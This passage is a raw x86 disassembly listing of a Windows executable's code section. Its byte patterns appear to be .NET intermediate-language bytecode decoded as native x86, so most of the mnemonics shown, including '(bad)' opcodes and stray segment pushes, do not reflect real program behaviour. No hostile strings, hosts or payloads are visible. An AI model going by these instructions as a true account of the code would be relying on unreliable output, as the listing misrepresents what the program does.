  402b61:	00 7c 16 00          	add    %bh,0x0(%esi,%edx,1)
  402b65:	00 04 12             	add    %al,(%edx,%edx,1)
  402b68:	00 28                	add    %ch,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	00 00                	add    %al,(%eax)
  402b6d:	2b 12                	sub    (%edx),%edx
  402b6f:	00 7c 16 00          	add    %bh,0x0(%esi,%edx,1)
  402b73:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b76:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402b7b:	00 13                	add    %dl,(%ebx)
  402b7d:	30 02                	xor    %al,(%edx)
  402b7f:	00 37                	add    %dh,(%edi)
  402b81:	00 00                	add    %al,(%eax)
  402b83:	00 07                	add    %al,(%edi)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	11 12                	adc    %edx,(%edx)
  402b89:	00 28                	add    %ch,(%eax)
  402b8b:	1b 00                	sbb    (%eax),%eax
  402b8d:	00 0a                	add    %cl,(%edx)
  402b8f:	7d 1c                	jge    0x402bad
  402b91:	00 00                	add    %al,(%eax)
  402b93:	04 12                	add    $0x12,%al
  402b95:	00 03                	add    %al,(%ebx)
  402b97:	7d 1d                	jge    0x402bb6
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	04 12                	add    $0x12,%al
  402b9d:	00 15 7d 1b 00 00    	add    %dl,0x1b7d
  402ba3:	04 12                	add    $0x12,%al
  402ba5:	00 7c 1c 00          	add    %bh,0x0(%esp,%ebx,1)
  402ba9:	00 04 12             	add    %al,(%edx,%edx,1)
  402bac:	00 28                	add    %ch,(%eax)
  402bae:	07                   	pop    %es
  402baf:	00 00                	add    %al,(%eax)
  402bb1:	2b 12                	sub    (%edx),%edx
  402bb3:	00 7c 1c 00          	add    %bh,0x0(%esp,%ebx,1)
  402bb7:	00 04 28             	add    %al,(%eax,%ebp,1)
  402bba:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402bbf:	00 13                	add    %dl,(%ebx)
  402bc1:	30 02                	xor    %al,(%edx)
  402bc3:	00 37                	add    %dh,(%edi)
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	00 08                	add    %cl,(%eax)
  402bc9:	00 00                	add    %al,(%eax)
  402bcb:	11 12                	adc    %edx,(%edx)
  402bcd:	00 28                	add    %ch,(%eax)
  402bcf:	1b 00                	sbb    (%eax),%eax
  402bd1:	00 0a                	add    %cl,(%edx)
  402bd3:	7d 20                	jge    0x402bf5
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	04 12                	add    $0x12,%al
  402bd9:	00 02                	add    %al,(%edx)
  402bdb:	7d 21                	jge    0x402bfe
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	04 12                	add    $0x12,%al
  402be1:	00 15 7d 1f 00 00    	add    %dl,0x1f7d
  402be7:	04 12                	add    $0x12,%al
  402be9:	00 7c 20 00          	add    %bh,0x0(%eax,%eiz,1)
  402bed:	00 04 12             	add    %al,(%edx,%edx,1)
  402bf0:	00 28                	add    %ch,(%eax)
  402bf2:	08 00                	or     %al,(%eax)
  402bf4:	00 2b                	add    %ch,(%ebx)
  402bf6:	12 00                	adc    (%eax),%al
  402bf8:	7c 20                	jl     0x402c1a
  402bfa:	00 00                	add    %al,(%eax)
  402bfc:	04 28                	add    $0x28,%al
  402bfe:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402c03:	00 13                	add    %dl,(%ebx)
  402c05:	30 02                	xor    %al,(%edx)
  402c07:	00 3f                	add    %bh,(%edi)
  402c09:	00 00                	add    %al,(%eax)
  402c0b:	00 09                	add    %cl,(%ecx)
  402c0d:	00 00                	add    %al,(%eax)
  402c0f:	11 12                	adc    %edx,(%edx)
  402c11:	00 28                	add    %ch,(%eax)
  402c13:	1b 00                	sbb    (%eax),%eax
  402c15:	00 0a                	add    %cl,(%edx)
  402c17:	7d 25                	jge    0x402c3e
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	04 12                	add    $0x12,%al
  402c1d:	00 02                	add    %al,(%edx)
  402c1f:	7d 27                	jge    0x402c48
  402c21:	00 00                	add    %al,(%eax)
  402c23:	04 12                	add    $0x12,%al
  402c25:	00 03                	add    %al,(%ebx)
  402c27:	7d 26                	jge    0x402c4f
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	04 12                	add    $0x12,%al
  402c2d:	00 15 7d 24 00 00    	add    %dl,0x247d
  402c33:	04 12                	add    $0x12,%al
  402c35:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  402c39:	00 04 12             	add    %al,(%edx,%edx,1)
  402c3c:	00 28                	add    %ch,(%eax)
  402c3e:	09 00                	or     %eax,(%eax)
  402c40:	00 2b                	add    %ch,(%ebx)
  402c42:	12 00                	adc    (%eax),%al
  402c44:	7c 25                	jl     0x402c6b
  402c46:	00 00                	add    %al,(%eax)
  402c48:	04 28                	add    $0x28,%al
  402c4a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402c4f:	00 13                	add    %dl,(%ebx)
  402c51:	30 02                	xor    %al,(%edx)
  402c53:	00 3f                	add    %bh,(%edi)
  402c55:	00 00                	add    %al,(%eax)
  402c57:	00 0a                	add    %cl,(%edx)
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	11 12                	adc    %edx,(%edx)
  402c5d:	00 28                	add    %ch,(%eax)
  402c5f:	1b 00                	sbb    (%eax),%eax
  402c61:	00 0a                	add    %cl,(%edx)
  402c63:	7d 2e                	jge    0x402c93
  402c65:	00 00                	add    %al,(%eax)
  402c67:	04 12                	add    $0x12,%al
  402c69:	00 03                	add    %al,(%ebx)
  402c6b:	7d 2f                	jge    0x402c9c
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	04 12                	add    $0x12,%al
  402c71:	00 04 7d 30 00 00 04 	add    %al,0x4000030(,%edi,2)
  402c78:	12 00                	adc    (%eax),%al
  402c7a:	15 7d 2d 00 00       	adc    $0x2d7d,%eax
  402c7f:	04 12                	add    $0x12,%al
  402c81:	00 7c 2e 00          	add    %bh,0x0(%esi,%ebp,1)
  402c85:	00 04 12             	add    %al,(%edx,%edx,1)
  402c88:	00 28                	add    %ch,(%eax)
  402c8a:	0a 00                	or     (%eax),%al
  402c8c:	00 2b                	add    %ch,(%ebx)
  402c8e:	12 00                	adc    (%eax),%al
  402c90:	7c 2e                	jl     0x402cc0
  402c92:	00 00                	add    %al,(%eax)
  402c94:	04 28                	add    $0x28,%al
  402c96:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402c9b:	00 13                	add    %dl,(%ebx)
  402c9d:	30 02                	xor    %al,(%edx)
  402c9f:	00 3f                	add    %bh,(%edi)
  402ca1:	00 00                	add    %al,(%eax)
  402ca3:	00 0b                	add    %cl,(%ebx)
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	11 12                	adc    %edx,(%edx)
  402ca9:	00 28                	add    %ch,(%eax)
  402cab:	1b 00                	sbb    (%eax),%eax
  402cad:	00 0a                	add    %cl,(%edx)
  402caf:	7d 33                	jge    0x402ce4
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	04 12                	add    $0x12,%al
  402cb5:	00 02                	add    %al,(%edx)
  402cb7:	7d 35                	jge    0x402cee
  402cb9:	00 00                	add    %al,(%eax)
  402cbb:	04 12                	add    $0x12,%al
  402cbd:	00 03                	add    %al,(%ebx)
  402cbf:	7d 34                	jge    0x402cf5
  402cc1:	00 00                	add    %al,(%eax)
  402cc3:	04 12                	add    $0x12,%al
  402cc5:	00 15 7d 32 00 00    	add    %dl,0x327d
  402ccb:	04 12                	add    $0x12,%al
  402ccd:	00 7c 33 00          	add    %bh,0x0(%ebx,%esi,1)
  402cd1:	00 04 12             	add    %al,(%edx,%edx,1)
  402cd4:	00 28                	add    %ch,(%eax)
  402cd6:	0b 00                	or     (%eax),%eax
  402cd8:	00 2b                	add    %ch,(%ebx)
  402cda:	12 00                	adc    (%eax),%al
  402cdc:	7c 33                	jl     0x402d11
  402cde:	00 00                	add    %al,(%eax)
  402ce0:	04 28                	add    $0x28,%al
  402ce2:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402ce7:	00 13                	add    %dl,(%ebx)
  402ce9:	30 02                	xor    %al,(%edx)
  402ceb:	00 47 00             	add    %al,0x0(%edi)
  402cee:	00 00                	add    %al,(%eax)
  402cf0:	0c 00                	or     $0x0,%al
  402cf2:	00 11                	add    %dl,(%ecx)
  402cf4:	12 00                	adc    (%eax),%al
  402cf6:	28 1b                	sub    %bl,(%ebx)
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	0a 7d 39             	or     0x39(%ebp),%bh
  402cfd:	00 00                	add    %al,(%eax)
  402cff:	04 12                	add    $0x12,%al
  402d01:	00 02                	add    %al,(%edx)
  402d03:	7d 3c                	jge    0x402d41
  402d05:	00 00                	add    %al,(%eax)
  402d07:	04 12                	add    $0x12,%al
  402d09:	00 03                	add    %al,(%ebx)
  402d0b:	7d 3b                	jge    0x402d48
  402d0d:	00 00                	add    %al,(%eax)
  402d0f:	04 12                	add    $0x12,%al
  402d11:	00 04 7d 3a 00 00 04 	add    %al,0x400003a(,%edi,2)
  402d18:	12 00                	adc    (%eax),%al
  402d1a:	15 7d 38 00 00       	adc    $0x387d,%eax
  402d1f:	04 12                	add    $0x12,%al
  402d21:	00 7c 39 00          	add    %bh,0x0(%ecx,%edi,1)
  402d25:	00 04 12             	add    %al,(%edx,%edx,1)
  402d28:	00 28                	add    %ch,(%eax)
  402d2a:	0c 00                	or     $0x0,%al
  402d2c:	00 2b                	add    %ch,(%ebx)
  402d2e:	12 00                	adc    (%eax),%al
  402d30:	7c 39                	jl     0x402d6b
  402d32:	00 00                	add    %al,(%eax)
  402d34:	04 28                	add    $0x28,%al
  402d36:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402d3b:	00 13                	add    %dl,(%ebx)
  402d3d:	30 02                	xor    %al,(%edx)
  402d3f:	00 37                	add    %dh,(%edi)
  402d41:	00 00                	add    %al,(%eax)
  402d43:	00 0d 00 00 11 12    	add    %cl,0x12110000
  402d49:	00 28                	add    %ch,(%eax)
  402d4b:	1b 00                	sbb    (%eax),%eax
  402d4d:	00 0a                	add    %cl,(%edx)
  402d4f:	7d 3f                	jge    0x402d90
  402d51:	00 00                	add    %al,(%eax)
  402d53:	04 12                	add    $0x12,%al
  402d55:	00 03                	add    %al,(%ebx)
  402d57:	7d 40                	jge    0x402d99
  402d59:	00 00                	add    %al,(%eax)
  402d5b:	04 12                	add    $0x12,%al
  402d5d:	00 15 7d 3e 00 00    	add    %dl,0x3e7d
  402d63:	04 12                	add    $0x12,%al
  402d65:	00 7c 3f 00          	add    %bh,0x0(%edi,%edi,1)
  402d69:	00 04 12             	add    %al,(%edx,%edx,1)
  402d6c:	00 28                	add    %ch,(%eax)
  402d6e:	0d 00 00 2b 12       	or     $0x122b0000,%eax
  402d73:	00 7c 3f 00          	add    %bh,0x0(%edi,%edi,1)
  402d77:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d7a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402d7f:	00 1b                	add    %bl,(%ebx)
  402d81:	30 05 00 fd 01 00    	xor    %al,0x1fd00
  402d87:	00 0e                	add    %cl,(%esi)
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	11 02                	adc    %eax,(%edx)
  402d8d:	7b 15                	jnp    0x402da4
  402d8f:	00 00                	add    %al,(%eax)
  402d91:	04 0a                	add    $0xa,%al
  402d93:	02 7b 18             	add    0x18(%ebx),%bh
  402d96:	00 00                	add    %al,(%eax)
  402d98:	04 0b                	add    $0xb,%al
  402d9a:	06                   	push   %es
  402d9b:	18 26                	sbb    %ah,(%esi)
  402d9d:	26 00 06             	add    %al,%es:(%esi)
  402da0:	45                   	inc    %ebp
  402da1:	03 00                	add    (%eax),%eax
  402da3:	00 00                	add    %al,(%eax)
  402da5:	5f                   	pop    %edi
  402da6:	00 00                	add    %al,(%eax)
  402da8:	00 e5                	add    %ah,%ch
  402daa:	00 00                	add    %al,(%eax)
  402dac:	00 51 01             	add    %dl,0x1(%ecx)
  402daf:	00 00                	add    %al,(%eax)
  402db1:	02 7b 17             	add    0x17(%ebx),%bh
  402db4:	00 00                	add    %al,(%eax)
  402db6:	04 17                	add    $0x17,%al
  402db8:	91                   	xchg   %eax,%ecx
  402db9:	0c 02                	or     $0x2,%al
  402dbb:	7b 17                	jnp    0x402dd4
  402dbd:	00 00                	add    %al,(%eax)
  402dbf:	04 18                	add    $0x18,%al
  402dc1:	91                   	xchg   %eax,%ecx
  402dc2:	0d 07 7b 13 00       	or     $0x137b07,%eax
  402dc7:	00 04 08             	add    %al,(%eax,%ecx,1)
  402dca:	09 07                	or     %eax,(%edi)
  402dcc:	fe 06                	incb   (%esi)
  402dce:	13 00                	adc    (%eax),%eax
  402dd0:	00 06                	add    %al,(%esi)
  402dd2:	73 4d                	jae    0x402e21
  402dd4:	00 00                	add    %al,(%eax)
  402dd6:	0a 6f 2f             	or     0x2f(%edi),%ch
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	06                   	push   %es
  402ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  402ddd:	4e                   	dec    %esi
  402dde:	00 00                	add    %al,(%eax)
  402de0:	0a 13                	or     (%ebx),%dl
  402de2:	05 12 05 28 4f       	add    $0x4f280512,%eax
  402de7:	00 00                	add    %al,(%eax)
  402de9:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  402def:	0a 7d 15             	or     0x15(%ebp),%bh
  402df2:	00 00                	add    %al,(%eax)
  402df4:	04 02                	add    $0x2,%al
  402df6:	11 05 7d 19 00 00    	adc    %eax,0x197d
  402dfc:	04 02                	add    $0x2,%al
  402dfe:	7c 16                	jl     0x402e16
  402e00:	00 00                	add    %al,(%eax)
  402e02:	04 12                	add    $0x12,%al
  402e04:	05 02 28 0e 00       	add    $0xe2802,%eax
  402e09:	00 2b                	add    %ch,(%ebx)
  402e0b:	dd 78 01             	fnstsw 0x1(%eax)
  402e0e:	00 00                	add    %al,(%eax)
  402e10:	02 7b 19             	add    0x19(%ebx),%bh
  402e13:	00 00                	add    %al,(%eax)
  402e15:	04 13                	add    $0x13,%al
  402e17:	05 02 7c 19 00       	add    $0x197c02,%eax
  402e1c:	00 04 fe             	add    %al,(%esi,%edi,8)
  402e1f:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  402e24:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402e2a:	00 00                	add    %al,(%eax)
  402e2c:	04 12                	add    $0x12,%al
  402e2e:	05 28 50 00 00       	add    $0x5028,%eax
  402e33:	0a 13                	or     (%ebx),%dl
  402e35:	04 11                	add    $0x11,%al
  402e37:	04 07                	add    $0x7,%al
  402e39:	7b 13                	jnp    0x402e4e
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	04 7d                	add    $0x7d,%al
  402e3f:	48                   	dec    %eax
  402e40:	00 00                	add    %al,(%eax)
  402e42:	04 07                	add    $0x7,%al
  402e44:	7b 13                	jnp    0x402e59
  402e46:	00 00                	add    %al,(%eax)
  402e48:	04 11                	add    $0x11,%al
  402e4a:	04 6f                	add    $0x6f,%al
  402e4c:	2d 00 00 06 11       	sub    $0x11060000,%eax
  402e51:	04 7b                	add    $0x7b,%al
  402e53:	4b                   	dec    %ebx
  402e54:	00 00                	add    %al,(%eax)
  402e56:	04 17                	add    $0x17,%al
  402e58:	33 62 07             	xor    0x7(%edx),%esp
  402e5b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402e5e:	16                   	push   %ss
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	06                   	push   %es
  402e62:	6f                   	outsl  %ds:(%esi),(%dx)
  402e63:	37                   	aaa
  402e64:	00 00                	add    %al,(%eax)
  402e66:	0a 13                	or     (%ebx),%dl
  402e68:	06                   	push   %es
  402e69:	12 06                	adc    (%esi),%al
  402e6b:	28 38                	sub    %bh,(%eax)
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  402e75:	0a 7d 15             	or     0x15(%ebp),%bh
  402e78:	00 00                	add    %al,(%eax)
  402e7a:	04 02                	add    $0x2,%al
  402e7c:	11 06                	adc    %eax,(%esi)
  402e7e:	7d 1a                	jge    0x402e9a
  402e80:	00 00                	add    %al,(%eax)
  402e82:	04 02                	add    $0x2,%al
  402e84:	7c 16                	jl     0x402e9c
  402e86:	00 00                	add    %al,(%eax)
  402e88:	04 12                	add    $0x12,%al
  402e8a:	06                   	push   %es
  402e8b:	02 28                	add    (%eax),%ch
  402e8d:	0f 00 00             	sldt   (%eax)
  402e90:	2b dd                	sub    %ebp,%ebx
  402e92:	f2 00 00             	repnz add %al,(%eax)
  402e95:	00 02                	add    %al,(%edx)
  402e97:	7b 1a                	jnp    0x402eb3
  402e99:	00 00                	add    %al,(%eax)
  402e9b:	04 13                	add    $0x13,%al
  402e9d:	06                   	push   %es
  402e9e:	02 7c 1a 00          	add    0x0(%edx,%ebx,1),%bh
  402ea2:	00 04 fe             	add    %al,(%esi,%edi,8)
  402ea5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  402eaa:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402eb0:	00 00                	add    %al,(%eax)
  402eb2:	04 12                	add    $0x12,%al
  402eb4:	06                   	push   %es
  402eb5:	28 39                	sub    %bh,(%ecx)
  402eb7:	00 00                	add    %al,(%eax)
  402eb9:	0a 2b                	or     (%ebx),%ch
  402ebb:	79 11                	jns    0x402ece
  402ebd:	04 7b                	add    $0x7b,%al
  402ebf:	4b                   	dec    %ebx
  402ec0:	00 00                	add    %al,(%eax)
  402ec2:	04 18                	add    $0x18,%al
  402ec4:	33 62 07             	xor    0x7(%edx),%esp
  402ec7:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402eca:	18 00                	sbb    %al,(%eax)
  402ecc:	00 06                	add    %al,(%esi)
  402ece:	6f                   	outsl  %ds:(%esi),(%dx)
  402ecf:	37                   	aaa
  402ed0:	00 00                	add    %al,(%eax)
  402ed2:	0a 13                	or     (%ebx),%dl
  402ed4:	06                   	push   %es
  402ed5:	12 06                	adc    (%esi),%al
  402ed7:	28 38                	sub    %bh,(%eax)
  402ed9:	00 00                	add    %al,(%eax)
  402edb:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  402ee1:	0a 7d 15             	or     0x15(%ebp),%bh
  402ee4:	00 00                	add    %al,(%eax)
  402ee6:	04 02                	add    $0x2,%al
  402ee8:	11 06                	adc    %eax,(%esi)
  402eea:	7d 1a                	jge    0x402f06
  402eec:	00 00                	add    %al,(%eax)
  402eee:	04 02                	add    $0x2,%al
  402ef0:	7c 16                	jl     0x402f08
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	04 12                	add    $0x12,%al
  402ef6:	06                   	push   %es
  402ef7:	02 28                	add    (%eax),%ch
  402ef9:	0f 00 00             	sldt   (%eax)
  402efc:	2b dd                	sub    %ebp,%ebx
  402efe:	86 00                	xchg   %al,(%eax)
  402f00:	00 00                	add    %al,(%eax)
  402f02:	02 7b 1a             	add    0x1a(%ebx),%bh
  402f05:	00 00                	add    %al,(%eax)
  402f07:	04 13                	add    $0x13,%al
  402f09:	06                   	push   %es
  402f0a:	02 7c 1a 00          	add    0x0(%edx,%ebx,1),%bh
  402f0e:	00 04 fe             	add    %al,(%esi,%edi,8)
  402f11:	15 0a 00 00 01       	adc    $0x100000a,%eax
  402f16:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	04 12                	add    $0x12,%al
  402f20:	06                   	push   %es
  402f21:	28 39                	sub    %bh,(%ecx)
  402f23:	00 00                	add    %al,(%eax)
  402f25:	0a 2b                	or     (%ebx),%ch
  402f27:	0d 11 04 2d 02       	or     $0x22d0411,%eax
  402f2c:	de 47 11             	fiadds 0x11(%edi)
  402f2f:	04 6f                	add    $0x6f,%al
  402f31:	2e 00 00             	add    %al,%cs:(%eax)
  402f34:	06                   	push   %es
  402f35:	de 23                	fisubs (%ebx)
  402f37:	26 72 2d             	es jb  0x402f67
  402f3a:	00 00                	add    %al,(%eax)
  402f3c:	70 02                	jo     0x402f40
  402f3e:	7b 17                	jnp    0x402f57
  402f40:	00 00                	add    %al,(%eax)
  402f42:	04 17                	add    $0x17,%al
  402f44:	8f                   	(bad)
  402f45:	2e 00 00             	add    %al,%cs:(%eax)
  402f48:	01 28                	add    %ebp,(%eax)
  402f4a:	51                   	push   %ecx
  402f4b:	00 00                	add    %al,(%eax)
  402f4d:	0a 28                	or     (%eax),%ch
  402f4f:	52                   	push   %edx
  402f50:	00 00                	add    %al,(%eax)
  402f52:	0a 28                	or     (%eax),%ch
  402f54:	29 00                	sub    %eax,(%eax)
  402f56:	00 0a                	add    %cl,(%edx)
  402f58:	de 00                	fiadds (%eax)
  402f5a:	de 19                	ficomps (%ecx)
  402f5c:	13 07                	adc    (%edi),%eax
  402f5e:	02 1f                	add    (%edi),%bl
  402f60:	fe                   	(bad)
  402f61:	7d 15                	jge    0x402f78
  402f63:	00 00                	add    %al,(%eax)
  402f65:	04 02                	add    $0x2,%al
  402f67:	7c 16                	jl     0x402f7f
  402f69:	00 00                	add    %al,(%eax)
  402f6b:	04 11                	add    $0x11,%al
  402f6d:	07                   	pop    %es
  402f6e:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  402f74:	13 02                	adc    (%edx),%eax
  402f76:	1f                   	pop    %ds
  402f77:	fe                   	(bad)
  402f78:	7d 15                	jge    0x402f8f
  402f7a:	00 00                	add    %al,(%eax)
  402f7c:	04 02                	add    $0x2,%al
  402f7e:	7c 16                	jl     0x402f96
  402f80:	00 00                	add    %al,(%eax)
  402f82:	04 28                	add    $0x28,%al
  402f84:	3e 00 00             	add    %al,%ds:(%eax)
  402f87:	0a 2a                	or     (%edx),%ch
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	00 41 34             	add    %al,0x34(%ecx)
  402f8e:	00 00                	add    %al,(%eax)
  402f90:	00 00                	add    %al,(%eax)
  402f92:	00 00                	add    %al,(%eax)
  402f94:	13 00                	adc    (%eax),%eax
  402f96:	00 00                	add    %al,(%eax)
  402f98:	98                   	cwtl
  402f99:	01 00                	add    %eax,(%eax)
  402f9b:	00 ab 01 00 00 23    	add    %ch,0x23000001(%ebx)
  402fa1:	00 00                	add    %al,(%eax)
  402fa3:	00 01                	add    %al,(%ecx)
  402fa5:	00 00                	add    %al,(%eax)
  402fa7:	01 00                	add    %eax,(%eax)
  402fa9:	00 00                	add    %al,(%eax)
  402fab:	00 0e                	add    %cl,(%esi)
  402fad:	00 00                	add    %al,(%eax)
  402faf:	00 c2                	add    %al,%dl
  402fb1:	01 00                	add    %eax,(%eax)
  402fb3:	00 d0                	add    %dl,%al
  402fb5:	01 00                	add    %eax,(%eax)
  402fb7:	00 19                	add    %bl,(%ecx)
  402fb9:	00 00                	add    %al,(%eax)
  402fbb:	00 0b                	add    %cl,(%ebx)
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	01 1b                	add    %ebx,(%ebx)
  402fc1:	30 04 00             	xor    %al,(%eax,%eax,1)
  402fc4:	4b                   	dec    %ebx
  402fc5:	01 00                	add    %eax,(%eax)
  402fc7:	00 0f                	add    %cl,(%edi)
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	11 02                	adc    %eax,(%edx)
  402fcd:	7b 1b                	jnp    0x402fea
  402fcf:	00 00                	add    %al,(%eax)
  402fd1:	04 0a                	add    $0xa,%al
  402fd3:	06                   	push   %es
  402fd4:	39 ea                	cmp    %ebp,%edx
  402fd6:	00 00                	add    %al,(%eax)
  402fd8:	00 02                	add    %al,(%edx)
  402fda:	7b 1d                	jnp    0x402ff9
  402fdc:	00 00                	add    %al,(%eax)
  402fde:	04 7b                	add    $0x7b,%al
  402fe0:	4b                   	dec    %ebx
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	04 2c                	add    $0x2c,%al
  402fe5:	05 dd 18 01 00       	add    $0x118dd,%eax
  402fea:	00 72 71             	add    %dh,0x71(%edx)
  402fed:	00 00                	add    %al,(%eax)
  402fef:	70 0b                	jo     0x402ffc
  402ff1:	1d 8d 34 00 00       	sbb    $0x348d,%eax
  402ff6:	01 25 16 28 73 00    	add    %esp,0x732816
  402ffc:	00 06                	add    %al,(%esi)
  402ffe:	a2 25 17 28 53       	mov    %al,0x53281725
  403003:	00 00                	add    %al,(%eax)
  403005:	0a a2 25 18 28 54    	or     0x54281825(%edx),%ah
  40300b:	00 00                	add    %al,(%eax)
  40300d:	0a 6f 55             	or     0x55(%edi),%ch
  403010:	00 00                	add    %al,(%eax)
  403012:	0a a2 25 19 07 a2    	or     -0x5df8e6db(%edx),%ah
  403018:	25 1a 28 72 00       	and    $0x72281a,%eax
  40301d:	00 06                	add    %al,(%esi)
  40301f:	a2 25 1b 28 71       	mov    %al,0x71281b25
  403024:	00 00                	add    %al,(%eax)
  403026:	06                   	push   %es
  403027:	a2 25 1c 28 70       	mov    %al,0x70281c25
  40302c:	00 00                	add    %al,(%eax)
  40302e:	06                   	push   %es
  40302f:	13 05 12 05 28 56    	adc    0x56280512,%eax
  403035:	00 00                	add    %al,(%eax)
  403037:	0a a2 0c 16 8d 2e    	or     0x2e8d160c(%edx),%ah
  40303d:	00 00                	add    %al,(%eax)
  40303f:	01 0d 17 8d 2e 00    	add    %ecx,0x2e8d17
  403045:	00 01                	add    %al,(%ecx)
  403047:	13 04 16             	adc    (%esi,%edx,1),%eax
  40304a:	13 06                	adc    (%esi),%eax
  40304c:	2b 31                	sub    (%ecx),%esi
  40304e:	28 27                	sub    %ah,(%edi)
  403050:	00 00                	add    %al,(%eax)
  403052:	0a 08                	or     (%eax),%cl
  403054:	11 06                	adc    %eax,(%esi)
  403056:	9a 6f 3b 00 00 0a 13 	lcall  $0x130a,$0x3b6f
  40305d:	07                   	pop    %es
  40305e:	09 11                	or     %edx,(%ecx)
  403060:	07                   	pop    %es
  403061:	28 45 00             	sub    %al,0x0(%ebp)
  403064:	00 06                	add    %al,(%esi)
  403066:	0d 11 06 08 8e       	or     $0x8e080611,%eax
  40306b:	69 17 59 2e 09 09    	imul   $0x9092e59,(%edi),%edx
  403071:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  403074:	45                   	inc    %ebp
  403075:	00 00                	add    %al,(%eax)
  403077:	06                   	push   %es
  403078:	0d 11 06 17 58       	or     $0x58170611,%eax
  40307d:	13 06                	adc    (%esi),%eax
  40307f:	11 06                	adc    %eax,(%esi)
  403081:	08 8e 69 32 c8 02    	or     %cl,0x2c83269(%esi)
  403087:	7b 1d                	jnp    0x4030a6
  403089:	00 00                	add    %al,(%eax)
  40308b:	04 09                	add    $0x9,%al
  40308d:	6f                   	outsl  %ds:(%esi),(%dx)
  40308e:	32 00                	xor    (%eax),%al
  403090:	00 06                	add    %al,(%esi)
  403092:	6f                   	outsl  %ds:(%esi),(%dx)
  403093:	2b 00                	sub    (%eax),%eax
  403095:	00 0a                	add    %cl,(%edx)
  403097:	13 08                	adc    (%eax),%ecx
  403099:	12 08                	adc    (%eax),%cl
  40309b:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40309e:	00 0a                	add    %cl,(%edx)
  4030a0:	2d 3e 02 16 25       	sub    $0x2516023e,%eax
  4030a5:	0a 7d 1b             	or     0x1b(%ebp),%bh
  4030a8:	00 00                	add    %al,(%eax)
  4030aa:	04 02                	add    $0x2,%al
  4030ac:	11 08                	adc    %ecx,(%eax)
  4030ae:	7d 1e                	jge    0x4030ce
  4030b0:	00 00                	add    %al,(%eax)
  4030b2:	04 02                	add    $0x2,%al
  4030b4:	7c 1c                	jl     0x4030d2
  4030b6:	00 00                	add    %al,(%eax)
  4030b8:	04 12                	add    $0x12,%al
  4030ba:	08 02                	or     %al,(%edx)
  4030bc:	28 10                	sub    %dl,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	2b de                	sub    %esi,%ebx
  4030c2:	53                   	push   %ebx
  4030c3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4030c6:	00 00                	add    %al,(%eax)
  4030c8:	04 13                	add    $0x13,%al
  4030ca:	08 02                	or     %al,(%edx)
  4030cc:	7c 1e                	jl     0x4030ec
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	04 fe                	add    $0xfe,%al
  4030d2:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4030d7:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  4030dd:	00 00                	add    %al,(%eax)
  4030df:	04 12                	add    $0x12,%al
  4030e1:	08 28                	or     %ch,(%eax)
  4030e3:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  4030e8:	de 19                	ficomps (%ecx)
  4030ea:	13 09                	adc    (%ecx),%ecx
  4030ec:	02 1f                	add    (%edi),%bl
  4030ee:	fe                   	(bad)
  4030ef:	7d 1b                	jge    0x40310c
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 02                	add    $0x2,%al
  4030f5:	7c 1c                	jl     0x403113
  4030f7:	00 00                	add    %al,(%eax)
  4030f9:	04 11                	add    $0x11,%al
  4030fb:	09 28                	or     %ebp,(%eax)
  4030fd:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  403102:	13 02                	adc    (%edx),%eax
  403104:	1f                   	pop    %ds
  403105:	fe                   	(bad)
  403106:	7d 1b                	jge    0x403123
  403108:	00 00                	add    %al,(%eax)
  40310a:	04 02                	add    $0x2,%al
  40310c:	7c 1c                	jl     0x40312a
  40310e:	00 00                	add    %al,(%eax)
  403110:	04 28                	add    $0x28,%al
